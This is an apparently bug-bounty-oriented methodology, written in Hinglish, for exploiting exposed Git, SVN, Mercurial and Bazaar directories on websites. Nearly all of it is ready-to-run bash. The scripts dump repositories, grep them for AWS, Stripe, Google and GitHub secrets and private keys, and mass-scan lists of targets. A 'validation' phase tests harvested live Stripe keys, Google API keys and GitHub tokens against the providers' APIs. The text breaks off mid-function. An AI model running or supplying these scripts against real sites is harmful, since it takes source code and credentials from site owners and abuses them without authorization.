# 🔥 Elite Git Repository & Source Code Exposure Methodology

## 🎯 Overview
Git repository aur source code exposure ek critical vulnerability hai jo developers accidentally production mein chhod dete hain. Yeh technique $200-$1000+ tak ka bug dilwa sakti hai kyunki isme complete source code, credentials, aur sensitive information mil jata hai.

## 🛠️ Phase 1: Git Repository Discovery

### Step 1: Basic Git Directory Detection
```bash
#!/bin/bash
# Save as git_discovery.sh

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./git_discovery.sh https://target.com"
    exit 1
fi

echo "🔍 Starting Git repository discovery for $TARGET"
mkdir -p git_results
cd git_results

# Basic .git directory paths
git_paths=(
    ".git"
    ".git/"
    ".git/config"
    ".git/HEAD"
    ".git/index"
    ".git/logs/HEAD"
    ".git/logs/refs/heads/master"
    ".git/logs/refs/heads/main"
    ".git/logs/refs/heads/develop"
    ".git/logs/refs/heads/dev"
    ".git/refs/heads/master"
    ".git/refs/heads/main"
    ".git/refs/heads/develop"
    ".git/refs/heads/dev"
    ".git/objects/"
    ".git/COMMIT_EDITMSG"
    ".git/description"
    ".git/hooks/"
    ".git/info/refs"
    ".git/packed-refs"
    ".git/refs/remotes/origin/HEAD"
    ".git/refs/stash"
    ".git/FETCH_HEAD"
    ".git/ORIG_HEAD"
)

echo "🔍 Testing basic Git paths..."
for path in "${git_paths[@]}"; do
    echo "Testing: $TARGET/$path"
    response=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "$TARGET/$path")
    http_code=$(echo $response | cut -d: -f1)
    size=$(echo $response | cut -d: -f2)
    
    if [[ $http_code == "200" && $size -gt 0 ]]; then
        echo "✅ FOUND: $TARGET/$path (HTTP: $http_code, Size: $size bytes)"
        echo "$TARGET/$path" >> git_exposed_paths.txt
        
        # Download the file
        curl -s "$TARGET/$path" -o "$(basename $path)_$(date +%s)"
    elif [[ $http_code == "403" ]]; then
        echo "🔒 FORBIDDEN (but exists): $TARGET/$path"
        echo "$TARGET/$path" >> git_forbidden_paths.txt
    fi
done

echo "✅ Basic Git discovery completed!"
```

### Step 2: Advanced Git Object Discovery
```bash
# Advanced Git objects enumeration
discover_git_objects() {
    local target=$1
    echo "🔍 Discovering Git objects for $target"
    
    # Common Git object patterns
    # Git objects are stored as: .git/objects/[first 2 chars]/[remaining 38 chars]
    
    # Try to get refs first
    refs_response=$(curl -s "$target/.git/refs/heads/master")
    if [[ ! -z "$refs_response" && ${#refs_response} == 40 ]]; then
        echo "✅ Found master branch SHA: $refs_response"
        
        # Extract first 2 characters for directory
        obj_dir=${refs_response:0:2}
        obj_file=${refs_response:2}
        
        # Try to download the object
        object_url="$target/.git/objects/$obj_dir/$obj_file"
        echo "🔍 Testing object: $object_url"
        
        curl -s "$object_url" -o "git_object_$obj_dir$obj_file"
        if [[ -s "git_object_$obj_dir$obj_file" ]]; then
            echo "✅ Downloaded Git object: git_object_$obj_dir$obj_file"
        fi
    fi
    
    # Try common object directories
    for i in {00..ff}; do
        echo "Testing objects directory: $target/.git/objects/$i/"
        response=$(curl -s -o /dev/null -w "%{http_code}" "$target/.git/objects/$i/")
        if [[ $response == "200" ]]; then
            echo "✅ Found objects directory: $target/.git/objects/$i/"
            echo "$target/.git/objects/$i/" >> git_object_dirs.txt
        fi
    done
}
```

### Step 3: Git Index File Analysis
```bash
# Git index file analysis
analyze_git_index() {
    local target=$1
    echo "📊 Analyzing Git index file for $target"
    
    # Download Git index
    curl -s "$target/.git/index" -o git_index_file
    
    if [[ -s git_index_file ]]; then
        echo "✅ Downloaded Git index file"
        
        # Extract file paths from index (basic parsing)
        strings git_index_file | grep -E '\.(php|js|py|java|cpp|c|h|sql|json|xml|yml|yaml|env|config)$' > indexed_files.txt
        
        echo "📁 Files found in Git index:"
        cat indexed_files.txt | head -20
        
        # Try to download these files
        while read file; do
            echo "🔍 Trying to download: $target/$file"
            curl -s "$target/$file" -o "source_$(basename $file)_$(date +%s)"
        done < indexed_files.txt
    fi
}
```

## 🔍 Phase 2: Complete Repository Reconstruction

### Method 1: GitHacker Tool Usage
```bash
# Install and use GitHacker for complete repo reconstruction
install_githacker() {
    echo "🛠️ Installing GitHacker..."
    
    # Install GitHacker
    git clone https://github.com/WangYihang/GitHacker.git
    cd GitHacker
    pip3 install -r requirements.txt
    
    echo "✅ GitHacker installed successfully"
}

# Use GitHacker to reconstruct repository
use_githacker() {
    local target=$1
    echo "🔧 Using GitHacker to reconstruct $target"
    
    # Run GitHacker
    python3 GitHacker/GitHacker.py --url "$target/.git/" --output-folder "reconstructed_$(date +%s)"
    
    echo "✅ Repository reconstruction completed"
}
```

### Method 2: Manual Git Repository Cloning
```bash
# Manual Git repository cloning
manual_git_clone() {
    local target=$1
    echo "📥 Attempting manual Git clone for $target"
    
    # Remove protocol for directory name
    repo_name=$(echo "$target" | sed 's/https\?:\/\///g' | tr '/' '_')
    
    # Try different clone methods
    echo "🔄 Trying direct clone..."
    git clone "$target/.git" "cloned_$repo_name" 2>/dev/null
    
    if [[ -d "cloned_$repo_name" ]]; then
        echo "✅ Successfully cloned repository"
        cd "cloned_$repo_name"
        
        # Get all branches
        echo "🌿 Available branches:"
        git branch -a
        
        # Get commit history
        echo "📝 Recent commits:"
        git log --oneline -10
        
        # Get all files
        echo "📁 Repository files:"
        find . -type f -name "*.php" -o -name "*.js" -o -name "*.py" -o -name "*.java" -o -name "*.sql" -o -name "*.json" -o -name "*.xml" -o -name "*.yml" -o -name "*.yaml" -o -name "*.env" -o -name "*.config" | head -20
        
        cd ..
    else
        echo "❌ Direct clone failed, trying alternative methods..."
        
        # Try wget recursive download
        wget -r -np -nH --cut-dirs=1 -R "index.html*" "$target/.git/" -P "wget_$repo_name" 2>/dev/null
        
        if [[ -d "wget_$repo_name" ]]; then
            echo "✅ Downloaded .git directory via wget"
        fi
    fi
}
```

### Method 3: Git-dumper Tool
```bash
# Install and use git-dumper
install_git_dumper() {
    echo "🛠️ Installing git-dumper..."
    
    # Install git-dumper
    pip3 install git-dumper
    
    echo "✅ git-dumper installed successfully"
}

use_git_dumper() {
    local target=$1
    echo "🔧 Using git-dumper for $target"
    
    # Create output directory
    output_dir="dumped_$(date +%s)"
    mkdir -p "$output_dir"
    
    # Run git-dumper
    git-dumper "$target/.git/" "$output_dir"
    
    if [[ -d "$output_dir" ]]; then
        echo "✅ Git dump completed in $output_dir"
        
        # Analyze the dumped repository
        cd "$output_dir"
        
        # Check if it's a valid git repository
        if [[ -d ".git" ]]; then
            echo "📊 Repository analysis:"
            git status
            git log --oneline -5
            
            # Find sensitive files
            find . -name "*.env" -o -name "config.*" -o -name "*.key" -o -name "*.pem" -o -name "*.sql" | head -10
        fi
        
        cd ..
    fi
}
```

## 🔐 Phase 3: Source Code Analysis & Secret Extraction

### Method 1: Automated Secret Scanning
```bash
#!/bin/bash
# Comprehensive secret scanning in source code

scan_secrets_in_code() {
    local directory=$1
    echo "🔍 Scanning for secrets in $directory"
    
    if [[ ! -d "$directory" ]]; then
        echo "❌ Directory not found: $directory"
        return 1
    fi
    
    cd "$directory"
    
    # Create results directory
    mkdir -p ../secret_analysis
    
    echo "🔑 Scanning for API keys and tokens..."
    
    # AWS Access Keys
    grep -r -E "AKIA[0-9A-Z]{16}" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.config" > ../secret_analysis/aws_keys.txt 2>/dev/null
    
    # AWS Secret Keys
    grep -r -E "[0-9a-zA-Z/+]{40}" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.config" | grep -i "secret" > ../secret_analysis/aws_secrets.txt 2>/dev/null
    
    # Stripe Keys
    grep -r -E "sk_live_[0-9a-zA-Z]{24}" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.config" > ../secret_analysis/stripe_live_keys.txt 2>/dev/null
    grep -r -E "sk_test_[0-9a-zA-Z]{24}" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.config" > ../secret_analysis/stripe_test_keys.txt 2>/dev/null
    
    # Google API Keys
    grep -r -E "AIza[0-9A-Za-z\-_]{35}" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.config" > ../secret_analysis/google_api_keys.txt 2>/dev/null
    
    # GitHub Tokens
    grep -r -E "ghp_[0-9A-Za-z]{36}" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.config" > ../secret_analysis/github_tokens.txt 2>/dev/null
    
    # JWT Tokens
    grep -r -E "eyJ[A-Za-z0-9-_=]*\.[A-Za-z0-9-_=]*\.[A-Za-z0-9-_.+/=]*" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.config" > ../secret_analysis/jwt_tokens.txt 2>/dev/null
    
    # Database Credentials
    grep -r -i -E "(password|passwd|pwd|secret|key)\s*[:=]\s*['"][^'"]{3,}['"]" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.config" > ../secret_analysis/database_credentials.txt 2>/dev/null
    
    # Email Addresses
    grep -r -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.config" > ../secret_analysis/email_addresses.txt 2>/dev/null
    
    # URLs and Endpoints
    grep -r -E "https?://[a-zA-Z0-9.-]+[a-zA-Z0-9/._-]*" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.config" > ../secret_analysis/urls_endpoints.txt 2>/dev/null
    
    # Private Keys
    grep -r -l "BEGIN.*PRIVATE KEY" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.config" --include="*.key" --include="*.pem" > ../secret_analysis/private_keys.txt 2>/dev/null
    
    # SSH Keys
    grep -r -l "ssh-rsa\|ssh-dss\|ssh-ed25519\|ecdsa-sha2" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.config" > ../secret_analysis/ssh_keys.txt 2>/dev/null
    
    cd ..
    
    echo "✅ Secret scanning completed. Results in secret_analysis/"
    
    # Summary
    echo "📊 Secrets Summary:"
    echo "AWS Keys: $(wc -l < secret_analysis/aws_keys.txt 2>/dev/null || echo 0)"
    echo "Stripe Keys: $(cat secret_analysis/stripe_*_keys.txt 2>/dev/null | wc -l || echo 0)"
    echo "Google API Keys: $(wc -l < secret_analysis/google_api_keys.txt 2>/dev/null || echo 0)"
    echo "GitHub Tokens: $(wc -l < secret_analysis/github_tokens.txt 2>/dev/null || echo 0)"
    echo "JWT Tokens: $(wc -l < secret_analysis/jwt_tokens.txt 2>/dev/null || echo 0)"
    echo "Database Credentials: $(wc -l < secret_analysis/database_credentials.txt 2>/dev/null || echo 0)"
    echo "Email Addresses: $(wc -l < secret_analysis/email_addresses.txt 2>/dev/null || echo 0)"
    echo "Private Keys: $(wc -l < secret_analysis/private_keys.txt 2>/dev/null || echo 0)"
}
```

### Method 2: TruffleHog Integration
```bash
# Install and use TruffleHog for advanced secret detection
install_trufflehog() {
    echo "🛠️ Installing TruffleHog..."
    
    # Install TruffleHog
    pip3 install truffleHog
    
    echo "✅ TruffleHog installed successfully"
}

use_trufflehog() {
    local directory=$1
    echo "🔍 Using TruffleHog to scan $directory"
    
    if [[ -d "$directory" ]]; then
        # Run TruffleHog on the directory
        truffleHog --regex --entropy=False "$directory" > trufflehog_results.json
        
        echo "✅ TruffleHog scan completed"
        echo "📄 Results saved in trufflehog_results.json"
        
        # Parse results
        if [[ -s trufflehog_results.json ]]; then
            echo "🔍 Found secrets:"
            cat trufflehog_results.json | jq -r '.[] | .printDiff' 2>/dev/null || cat trufflehog_results.json
        fi
    fi
}
```

### Method 3: GitLeaks Integration
```bash
# Install and use GitLeaks
install_gitleaks() {
    echo "🛠️ Installing GitLeaks..."
    
    # Download GitLeaks
    wget https://github.com/zricethezav/gitleaks/releases/download/v8.15.0/gitleaks_8.15.0_linux_x64.tar.gz
    tar -xzf gitleaks_8.15.0_linux_x64.tar.gz
    chmod +x gitleaks
    sudo mv gitleaks /usr/local/bin/
    
    echo "✅ GitLeaks installed successfully"
}

use_gitleaks() {
    local directory=$1
    echo "🔍 Using GitLeaks to scan $directory"
    
    if [[ -d "$directory" ]]; then
        cd "$directory"
        
        # Run GitLeaks
        gitleaks detect --source . --report-format json --report-path ../gitleaks_report.json
        
        cd ..
        
        if [[ -s gitleaks_report.json ]]; then
            echo "✅ GitLeaks scan completed"
            echo "📄 Results saved in gitleaks_report.json"
            
            # Parse results
            echo "🔍 Found secrets:"
            cat gitleaks_report.json | jq -r '.[] | "\(.RuleID): \(.Secret)"' 2>/dev/null || cat gitleaks_report.json
        fi
    fi
}
```

## 🎯 Phase 4: Advanced Git History Analysis

### Method 1: Commit History Deep Dive
```bash
# Deep analysis of Git commit history
analyze_git_history() {
    local repo_dir=$1
    echo "📚 Analyzing Git history in $repo_dir"
    
    if [[ ! -d "$repo_dir/.git" ]]; then
        echo "❌ Not a valid Git repository: $repo_dir"
        return 1
    fi
    
    cd "$repo_dir"
    
    echo "📊 Repository Statistics:"
    echo "Total commits: $(git rev-list --all --count)"
    echo "Total branches: $(git branch -a | wc -l)"
    echo "Total contributors: $(git log --format='%aN' | sort -u | wc -l)"
    
    echo "👥 Contributors:"
    git log --format='%aN <%aE>' | sort -u | head -10
    
    echo "📝 Recent commits with sensitive keywords:"
    git log --all --grep="password\|secret\|key\|token\|api\|credential\|config" --oneline | head -10
    
    echo "🔍 Files with sensitive names in history:"
    git log --all --name-only --pretty=format: | sort -u | grep -E "\.(env|key|pem|p12|pfx|jks|keystore|config|sql|backup)$" | head -20
    
    echo "🗑️ Deleted files (might contain secrets):"
    git log --all --diff-filter=D --summary | grep delete | head -10
    
    echo "📁 Large files (might be databases/backups):"
    git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | sed -n 's/^blob //p' | sort --numeric-sort --key=2 | tail -10
    
    # Check for sensitive content in all commits
    echo "🔐 Searching for secrets in all commits..."
    git log --all -p | grep -E "password|secret|key|token|api" | head -20 > ../git_history_secrets.txt
    
    # Check for hardcoded credentials
    echo "🔑 Searching for hardcoded credentials..."
    git log --all -p | grep -E "(password|passwd|pwd|secret|key)\s*[:=]\s*['"][^'"]{3,}['"]" | head -10 > ../git_hardcoded_creds.txt
    
    cd ..
    
    echo "✅ Git history analysis completed"
}
```

### Method 2: Branch and Tag Analysis
```bash
# Analyze all branches and tags for sensitive information
analyze_branches_tags() {
    local repo_dir=$1
    echo "🌿 Analyzing branches and tags in $repo_dir"
    
    if [[ ! -d "$repo_dir/.git" ]]; then
        echo "❌ Not a valid Git repository: $repo_dir"
        return 1
    fi
    
    cd "$repo_dir"
    
    # Get all branches
    echo "📋 All branches:"
    git branch -a | tee ../all_branches.txt
    
    # Get all tags
    echo "🏷️ All tags:"
    git tag -l | tee ../all_tags.txt
    
    # Check each branch for sensitive files
    echo "🔍 Checking branches for sensitive files..."
    git branch -a | grep -v HEAD | while read branch; do
        branch_name=$(echo "$branch" | sed 's/^[* ] //' | sed 's/remotes\///')
        echo "Checking branch: $branch_name"
        
        # Checkout branch (suppress output)
        git checkout "$branch_name" 2>/dev/null
        
        # Find sensitive files
        find . -name "*.env" -o -name "config.*" -o -name "*.key" -o -name "*.pem" -o -name "*.sql" -o -name "*.backup" 2>/dev/null | while read file; do
            echo "Found in $branch_name: $file" >> ../branch_sensitive_files.txt
        done
    done
    
    # Check each tag
    echo "🏷️ Checking tags for sensitive files..."
    git tag -l | while read tag; do
        echo "Checking tag: $tag"
        git checkout "$tag" 2>/dev/null
        
        find . -name "*.env" -o -name "config.*" -o -name "*.key" -o -name "*.pem" -o -name "*.sql" -o -name "*.backup" 2>/dev/null | while read file; do
            echo "Found in $tag: $file" >> ../tag_sensitive_files.txt
        done
    done
    
    # Return to main branch
    git checkout main 2>/dev/null || git checkout master 2>/dev/null
    
    cd ..
    
    echo "✅ Branch and tag analysis completed"
}
```

### Method 3: Stash and Reflog Analysis
```bash
# Analyze Git stash and reflog for hidden secrets
analyze_stash_reflog() {
    local repo_dir=$1
    echo "📦 Analyzing stash and reflog in $repo_dir"
    
    if [[ ! -d "$repo_dir/.git" ]]; then
        echo "❌ Not a valid Git repository: $repo_dir"
        return 1
    fi
    
    cd "$repo_dir"
    
    # Check Git stash
    echo "📦 Checking Git stash..."
    git stash list > ../stash_list.txt
    
    if [[ -s ../stash_list.txt ]]; then
        echo "✅ Found stashed changes:"
        cat ../stash_list.txt
        
        # Show stash contents
        git stash list | while read stash; do
            stash_id=$(echo "$stash" | cut -d: -f1)
            echo "📄 Contents of $stash_id:"
            git stash show -p "$stash_id" | grep -E "password|secret|key|token|api" | head -5
        done > ../stash_secrets.txt
    fi
    
    # Check reflog
    echo "📜 Checking reflog..."
    git reflog > ../reflog.txt
    
    # Look for interesting reflog entries
    grep -E "commit|merge|rebase|reset" ../reflog.txt | head -20 > ../interesting_reflog.txt
    
    # Check reflog commits for secrets
    echo "🔍 Checking reflog commits for secrets..."
    git reflog | head -50 | while read entry; do
        commit_hash=$(echo "$entry" | cut -d' ' -f1)
        git show "$commit_hash" | grep -E "password|secret|key|token|api" | head -3
    done > ../reflog_secrets.txt
    
    cd ..
    
    echo "✅ Stash and reflog analysis completed"
}
```

## 🚀 Phase 5: Other Version Control Systems

### Method 1: SVN Repository Discovery
```bash
# SVN repository discovery and analysis
discover_svn_repos() {
    local target=$1
    echo "🔍 Discovering SVN repositories for $target"
    
    # SVN paths to test
    svn_paths=(
        ".svn"
        ".svn/"
        ".svn/entries"
        ".svn/wc.db"
        ".svn/all-wcprops"
        ".svn/dir-props"
        ".svn/text-base/"
        ".svn/prop-base/"
        ".svn/props/"
        ".svn/tmp/"
        ".svn/pristine/"
    )
    
    echo "🔍 Testing SVN paths..."
    for path in "${svn_paths[@]}"; do
        echo "Testing: $target/$path"
        response=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "$target/$path")
        http_code=$(echo $response | cut -d: -f1)
        size=$(echo $response | cut -d: -f2)
        
        if [[ $http_code == "200" && $size -gt 0 ]]; then
            echo "✅ FOUND SVN: $target/$path (HTTP: $http_code, Size: $size bytes)"
            echo "$target/$path" >> svn_exposed_paths.txt
            
            # Download the file/directory
            curl -s "$target/$path" -o "svn_$(basename $path)_$(date +%s)"
        fi
    done
    
    # Try to download SVN entries file for analysis
    if curl -s "$target/.svn/entries" -o svn_entries 2>/dev/null; then
        if [[ -s svn_entries ]]; then
            echo "✅ Downloaded SVN entries file"
            echo "📊 SVN Repository Analysis:"
            
            # Parse SVN entries (basic parsing)
            cat svn_entries | grep -E '\.(php|js|py|java|cpp|c|h|sql|json|xml|yml|yaml|env|config)$' > svn_files.txt
            
            echo "📁 Files found in SVN:"
            cat svn_files.txt | head -20
        fi
    fi
}
```

### Method 2: Mercurial (Hg) Repository Discovery
```bash
# Mercurial repository discovery
discover_hg_repos() {
    local target=$1
    echo "🔍 Discovering Mercurial repositories for $target"
    
    # Mercurial paths to test
    hg_paths=(
        ".hg"
        ".hg/"
        ".hg/hgrc"
        ".hg/dirstate"
        ".hg/branch"
        ".hg/requires"
        ".hg/store/"
        ".hg/store/data/"
        ".hg/store/00manifest.i"
        ".hg/store/00changelog.i"
    )
    
    echo "🔍 Testing Mercurial paths..."
    for path in "${hg_paths[@]}"; do
        echo "Testing: $target/$path"
        response=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "$target/$path")
        http_code=$(echo $response | cut -d: -f1)
        size=$(echo $response | cut -d: -f2)
        
        if [[ $http_code == "200" && $size -gt 0 ]]; then
            echo "✅ FOUND Mercurial: $target/$path (HTTP: $http_code, Size: $size bytes)"
            echo "$target/$path" >> hg_exposed_paths.txt
            
            # Download the file
            curl -s "$target/$path" -o "hg_$(basename $path)_$(date +%s)"
        fi
    done
}
```

### Method 3: Bazaar Repository Discovery
```bash
# Bazaar repository discovery
discover_bzr_repos() {
    local target=$1
    echo "🔍 Discovering Bazaar repositories for $target"
    
    # Bazaar paths to test
    bzr_paths=(
        ".bzr"
        ".bzr/"
        ".bzr/branch/branch.conf"
        ".bzr/branch/format"
        ".bzr/branch/last-revision"
        ".bzr/repository/format"
        ".bzr/checkout/format"
        ".bzr/checkout/conflicts"
    )
    
    echo "🔍 Testing Bazaar paths..."
    for path in "${bzr_paths[@]}"; do
        echo "Testing: $target/$path"
        response=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "$target/$path")
        http_code=$(echo $response | cut -d: -f1)
        size=$(echo $response | cut -d: -f2)
        
        if [[ $http_code == "200" && $size -gt 0 ]]; then
            echo "✅ FOUND Bazaar: $target/$path (HTTP: $http_code, Size: $size bytes)"
            echo "$target/$path" >> bzr_exposed_paths.txt
            
            # Download the file
            curl -s "$target/$path" -o "bzr_$(basename $path)_$(date +%s)"
        fi
    done
}
```

## 🔐 Phase 6: Advanced Exploitation Techniques

### Method 1: Automated Secret Validation
```bash
# Validate extracted secrets automatically
validate_extracted_secrets() {
    echo "🧪 Validating extracted secrets..."
    
    # Validate AWS Keys
    if [[ -f "secret_analysis/aws_keys.txt" && -s "secret_analysis/aws_keys.txt" ]]; then
        echo "🔑 Validating AWS keys..."
        while read line; do
            aws_key=$(echo "$line" | grep -oE "AKIA[0-9A-Z]{16}")
            if [[ ! -z "$aws_key" ]]; then
                echo "Testing AWS key: $aws_key"
                # Note: Be careful with this in real scenarios
                # aws sts get-caller-identity --profile test 2>/dev/null && echo "✅ Valid AWS key: $aws_key"
                echo "⚠️ Manual validation required for AWS key: $aws_key"
            fi
        done < secret_analysis/aws_keys.txt
    fi
    
    # Validate Stripe Keys
    if [[ -f "secret_analysis/stripe_live_keys.txt" && -s "secret_analysis/stripe_live_keys.txt" ]]; then
        echo "💳 Validating Stripe keys..."
        while read line; do
            stripe_key=$(echo "$line" | grep -oE "sk_live_[0-9a-zA-Z]{24}")
            if [[ ! -z "$stripe_key" ]]; then
                echo "Testing Stripe key: $stripe_key"
                response=$(curl -s -u "$stripe_key:" https://api.stripe.com/v1/balance)
                if echo "$response" | grep -q "object"; then
                    echo "✅ Valid Stripe key: $stripe_key"
                    echo "$stripe_key" >> validated_stripe_keys.txt
                else
                    echo "❌ Invalid Stripe key: $stripe_key"
                fi
            fi
        done < secret_analysis/stripe_live_keys.txt
    fi
    
    # Validate Google API Keys
    if [[ -f "secret_analysis/google_api_keys.txt" && -s "secret_analysis/google_api_keys.txt" ]]; then
        echo "🔍 Validating Google API keys..."
        while read line; do
            google_key=$(echo "$line" | grep -oE "AIza[0-9A-Za-z\-_]{35}")
            if [[ ! -z "$google_key" ]]; then
                echo "Testing Google API key: $google_key"
                response=$(curl -s "https://www.googleapis.com/youtube/v3/search?part=snippet&q=test&key=$google_key")
                if echo "$response" | grep -q "items"; then
                    echo "✅ Valid Google API key: $google_key"
                    echo "$google_key" >> validated_google_keys.txt
                else
                    echo "❌ Invalid Google API key: $google_key"
                fi
            fi
        done < secret_analysis/google_api_keys.txt
    fi
    
    # Validate GitHub Tokens
    if [[ -f "secret_analysis/github_tokens.txt" && -s "secret_analysis/github_tokens.txt" ]]; then
        echo "🐙 Validating GitHub tokens..."
        while read line; do
            github_token=$(echo "$line" | grep -oE "ghp_[0-9A-Za-z]{36}")
            if [[ ! -z "$github_token" ]]; then
                echo "Testing GitHub token: $github_token"
                response=$(curl -s -H "Authorization: token $github_token" https://api.github.com/user)
                if echo "$response" | grep -q "login"; then
                    echo "✅ Valid GitHub token: $github_token"
                    echo "$github_token" >> validated_github_tokens.txt
                else
                    echo "❌ Invalid GitHub token: $github_token"
                fi
            fi
        done < secret_analysis/github_tokens.txt
    fi
}
```

### Method 2: Database Connection Testing
```bash
# Test database connections found in source code
test_database_connections() {
    echo "🗄️ Testing database connections..."
    
    if [[ -f "secret_analysis/database_credentials.txt" && -s "secret_analysis/database_credentials.txt" ]]; then
        echo "🔍 Found database credentials, manual testing required:"
        cat secret_analysis/database_credentials.txt | head -10
        
        # Extract common database patterns
        grep -i "mysql\|postgresql\|postgres\|mongodb\|redis" secret_analysis/database_credentials.txt > db_connections.txt
        
        echo "📊 Database types found:"
        grep -i "mysql" db_connections.txt | wc -l | xargs echo "MySQL connections:"
        grep -i "postgres" db_connections.txt | wc -l | xargs echo "PostgreSQL connections:"
        grep -i "mongodb" db_connections.txt | wc -l | xargs echo "MongoDB connections:"
        grep -i "redis" db_connections.txt | wc -l | xargs echo "Redis connections:"
        
        echo "⚠️ Manual database connection testing required"
        echo "📄 Check db_connections.txt for details"
    fi
}
```

### Method 3: API Endpoint Discovery
```bash
# Discover API endpoints from source code
discover_api_endpoints() {
    local repo_dir=$1
    echo "🔗 Discovering API endpoints in $repo_dir"
    
    if [[ ! -d "$repo_dir" ]]; then
        echo "❌ Directory not found: $repo_dir"
        return 1
    fi
    
    cd "$repo_dir"
    
    # Find API endpoints in various file types
    echo "🔍 Searching for API endpoints..."
    
    # REST API patterns
    grep -r -E "(GET|POST|PUT|DELETE|PATCH)\s+['"]?/[a-zA-Z0-9/_-]+['"]?" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.rb" --include="*.go" > ../api_endpoints_rest.txt 2>/dev/null
    
    # URL patterns
    grep -r -E "https?://[a-zA-Z0-9.-]+/[a-zA-Z0-9/._-]*" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" --include="*.xml" --include="*.yml" --include="*.yaml" > ../api_endpoints_urls.txt 2>/dev/null
    
    # API route definitions
    grep -r -E "(route|app\.(get|post|put|delete|patch)|@(Get|Post|Put|Delete|Patch)Mapping)" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.rb" --include="*.go" > ../api_route_definitions.txt 2>/dev/null
    
    # GraphQL endpoints
    grep -r -i "graphql\|/graphql\|query\|mutation" . --include="*.php" --include="*.js" --include="*.py" --include="*.java" --include="*.json" > ../graphql_endpoints.txt 2>/dev/null
    
    # Swagger/OpenAPI definitions
    find . -name "swagger.json" -o -name "openapi.json" -o -name "api-docs.json" > ../swagger_files.txt 2>/dev/null
    
    cd ..
    
    echo "✅ API endpoint discovery completed"
    echo "📊 Results:"
    echo "REST endpoints: $(wc -l < api_endpoints_rest.txt 2>/dev/null || echo 0)"
    echo "URL patterns: $(wc -l < api_endpoints_urls.txt 2>/dev/null || echo 0)"
    echo "Route definitions: $(wc -l < api_route_definitions.txt 2>/dev/null || echo 0)"
    echo "GraphQL endpoints: $(wc -l < graphql_endpoints.txt 2>/dev/null || echo 0)"
    echo "Swagger files: $(wc -l < swagger_files.txt 2>/dev/null || echo 0)"
}
```

## 🚀 Phase 7: Mass Scanning & Automation

### Method 1: Multi-Target Git Discovery
```bash
#!/bin/bash
# Mass Git repository discovery across multiple targets

mass_git_discovery() {
    local targets_file=$1
    
    if [[ ! -f "$targets_file" ]]; then
        echo "Usage: mass_git_discovery targets.txt"
        return 1
    fi
    
    echo "🚀 Starting mass Git discovery..."
    mkdir -p mass_git_results
    
    while IFS= read -r target; do
        echo "🎯 Scanning: $target"
        target_name=$(echo "$target" | sed 's/https\?:\/\///g' | tr '/' '_')
        mkdir -p "mass_git_results/$target_name"
        
        # Quick Git check
        response=$(curl -s -o /dev/null -w "%{http_code}" "$target/.git/config")
        if [[ $response == "200" ]]; then
            echo "✅ Git repository found: $target"
            echo "$target" >> mass_git_results/found_git_repos.txt
            
            # Try to clone
            git clone "$target/.git" "mass_git_results/$target_name/cloned" 2>/dev/null
            
            if [[ -d "mass_git_results/$target_name/cloned" ]]; then
                echo "📥 Successfully cloned: $target"
                
                # Quick secret scan
                cd "mass_git_results/$target_name/cloned"
                find . -name "*.env" -o -name "config.*" -o -name "*.key" -o -name "*.pem" > ../sensitive_files.txt 2>/dev/null
                grep -r -E "AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24}|AIza[0-9A-Za-z\-_]{35}" . --include="*.php" --include="*.js" --include="*.py" --include="*.json" > ../secrets_found.txt 2>/dev/null
                cd ../../..
                
                if [[ -s "mass_git_results/$target_name/secrets_found.txt" ]]; then
                    echo "🔑 Secrets found in: $target"
                    echo "$target" >> mass_git_results/repos_with_secrets.txt
                fi
            fi
        fi
        
    done < "$targets_file"
    
    echo "📊 Mass Git discovery completed"
    echo "Total Git repos found: $(wc -l < mass_git_results/found_git_repos.txt 2>/dev/null || echo 0)"
    echo "Repos with secrets: $(wc -l < mass_git_results/repos_with_secrets.txt 2>/dev/null || echo 0)"
}
```

### Method 2: Parallel Git Processing
```bash
# Parallel Git repository processing
parallel_git_processing() {
    local targets_file=$1
    
    echo "⚡ Starting parallel Git processing..."
    
    # Function to process single target
    process_single_git_target() {
        local target=$1
        local output_dir="parallel_git_results/$(echo $target | sed 's/https\?:\/\///g' | tr '/' '_')"
        mkdir -p "$output_dir"
        
        # Test for Git repository
        if curl -s -o /dev/null -w "%{http_code}" "$target/.git/config" | grep -q "200"; then
